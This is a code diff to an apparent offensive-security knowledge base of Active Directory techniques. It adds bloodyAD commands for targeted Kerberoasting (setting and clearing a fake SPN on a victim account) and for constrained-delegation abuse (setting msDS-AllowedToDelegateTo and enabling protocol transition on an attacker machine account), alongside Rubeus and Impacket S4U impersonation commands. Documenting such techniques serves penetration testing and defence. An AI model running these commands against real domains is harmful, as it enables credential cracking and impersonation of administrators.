@@ -331,9 +331,14 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     summary: 'Set a temp SPN on a controlled user, then roast it.',
     description:
       'With GenericWrite/GenericAll over a target user that has no SPN, temporarily set a servicePrincipalName, request a TGS, then remove the SPN. The TGS is encrypted with the target password hash and cracked offline, turning a write-ACL edge into a credential.',
-    tools: [{ name: 'targetedKerberoast', url: 'https://github.com/ShutdownRepo/targetedKerberoast' }],
+    tools: [
+      { name: 'targetedKerberoast', url: 'https://github.com/ShutdownRepo/targetedKerberoast' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
+    ],
     commands: [
       { label: 'Set SPN, roast, then clean up', code: r`targetedKerberoast.py -d domain.local -u user -p pass --request-user TARGET --dc-ip 10.0.0.1`, lang: 'bash' },
+      { label: 'Write a fake SPN on the victim (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object victim servicePrincipalName -v 'fake/svc'`, lang: 'bash' },
+      { label: 'Clear the SPN afterward (no value deletes it)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object victim servicePrincipalName`, lang: 'bash' },
     ],
     requires: ['GenericWrite/GenericAll over the target user', 'Target password crackable offline'],
     mitre: mitre('T1558.003'),
@@ -352,10 +357,13 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
       { name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
     ],
     commands: [
       { label: 'S4U with Rubeus', code: r`Rubeus.exe s4u /user:websvc$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt`, lang: 'powershell' },
       { label: 'S4U with Impacket getST', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator -hashes :<HASH> domain.local/websvc$`, lang: 'bash' },
+      { label: 'Configure the delegation target (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 set object 'attacker$' msDS-AllowedToDelegateTo -v 'cifs/target.domain.local'`, lang: 'bash' },
+      { label: 'Enable protocol transition (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add uac 'attacker$' -f TRUSTED_TO_AUTH_FOR_DELEGATION`, lang: 'bash' },
     ],
     requires: ['Control of an account with msDS-AllowedToDelegateTo set', "That account's hash/key"],
     references: [
